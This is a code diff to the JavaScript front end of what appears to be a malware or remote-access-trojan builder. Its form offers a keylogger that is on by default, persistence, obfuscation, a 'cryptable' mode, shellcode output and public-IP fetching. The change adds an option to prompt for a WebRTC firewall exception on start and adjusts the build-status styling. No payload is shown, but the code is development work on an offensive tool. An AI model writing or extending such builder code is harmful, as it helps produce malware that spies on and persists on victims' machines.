@@ -304,6 +304,7 @@ function setBuildField(field, value) {
     stripDebug: 'input[name="strip-debug"]',
     noPrinting: 'input[name="no-printing"]',
     enableWebrtc: 'input[name="enable-webrtc"]',
+    promptWebrtcFirewallOnStart: 'input[name="prompt-webrtc-firewall-on-start"]',
     enableWinRE: 'input[name="enable-winre"]',
     fetchPublicIP: 'input[name="fetch-public-ip"]',
     enablePersistence: 'input[name="enable-persistence"]',
@@ -574,6 +575,7 @@ function collectFormSettings() {
     noPrinting: document.querySelector('input[name="no-printing"]')?.checked ?? false,
     enableKeylogger: document.querySelector('input[name="enable-keylogger"]')?.checked ?? true,
     enableWebrtc: document.querySelector('input[name="enable-webrtc"]')?.checked ?? false,
+    promptWebrtcFirewallOnStart: document.querySelector('input[name="prompt-webrtc-firewall-on-start"]')?.checked ?? false,
     enableWinRE: document.querySelector('input[name="enable-winre"]')?.checked ?? false,
     fetchPublicIP: document.querySelector('input[name="fetch-public-ip"]')?.checked ?? false,
     obfuscate: document.querySelector('input[name="obfuscate"]')?.checked ?? false,
@@ -649,6 +651,7 @@ function applyFormSettings(settings) {
   if (settings.noPrinting !== undefined) setCb('input[name="no-printing"]', settings.noPrinting);
   if (settings.enableKeylogger !== undefined) setCb('input[name="enable-keylogger"]', settings.enableKeylogger);
   if (settings.enableWebrtc !== undefined) setCb('input[name="enable-webrtc"]', settings.enableWebrtc);
+  if (settings.promptWebrtcFirewallOnStart !== undefined) setCb('input[name="prompt-webrtc-firewall-on-start"]', settings.promptWebrtcFirewallOnStart);
   if (settings.enableWinRE !== undefined) setCb('input[name="enable-winre"]', settings.enableWinRE);
   if (settings.fetchPublicIP !== undefined) setCb('input[name="fetch-public-ip"]', settings.fetchPublicIP);
   if (settings.obfuscate !== undefined) setCb('input[name="obfuscate"]', settings.obfuscate);
@@ -720,6 +723,7 @@ function applyFormSettings(settings) {
     updateServerUrlPlaceholder();
   }
   applyCryptableMode(document.getElementById("cryptable-mode")?.checked || false);
+  updateWebrtcFirewallPromptOption();
 }
 
 function saveFormSettings() {
@@ -956,6 +960,14 @@ function applyLinuxShellcodeMode(enabled) {
   saveFormSettings();
 }
 
+function updateWebrtcFirewallPromptOption() {
+  const webrtcEnabled = document.querySelector('input[name="enable-webrtc"]')?.checked ?? false;
+  const promptInput = document.querySelector('input[name="prompt-webrtc-firewall-on-start"]');
+  if (!promptInput) return;
+  promptInput.disabled = !webrtcEnabled;
+  if (!webrtcEnabled) promptInput.checked = false;
+}
+
 restoreFormSettings();
 initAccordions();
 initBuilderTabs();
@@ -1165,6 +1177,7 @@ updatePersistenceSettingsVisibility();
 
 form?.addEventListener("change", saveFormSettings);
 form?.addEventListener("input", saveFormSettings);
+document.querySelector('input[name="enable-webrtc"]')?.addEventListener("change", updateWebrtcFirewallPromptOption);
 
 const obfuscateCheckbox = document.querySelector('input[name="obfuscate"]');
 const garbleSettingsContainer = document.getElementById("garble-settings-container");
@@ -1896,6 +1909,7 @@ form?.addEventListener("submit", async (e) => {
     noPrinting,
     disableKeylogger: !enableKeylogger,
     enableWebrtc: form.querySelector('input[name="enable-webrtc"]')?.checked || false,
+    promptWebrtcFirewallOnStart: form.querySelector('input[name="enable-webrtc"]')?.checked === true && (form.querySelector('input[name="prompt-webrtc-firewall-on-start"]')?.checked || false),
     enableWinRE: form.querySelector('input[name="enable-winre"]')?.checked || false,
     fetchPublicIP: form.querySelector('input[name="fetch-public-ip"]')?.checked || false,
     outputName: outputNameVal || undefined,
@@ -2002,6 +2016,9 @@ async function startBuild(config) {
 
   buildStatus.classList.remove("hidden");
   buildStatusText.textContent = "Starting build...";
+  buildStatus.querySelector("div").className =
+    "flex items-center gap-2 p-3 rounded-lg bg-blue-900/40 border border-blue-700/60";
+  buildStatus.querySelector("i").className = "fa-solid fa-spinner fa-spin";
   buildResults.classList.add("hidden");
   buildFilesDiv.innerHTML = "";
 
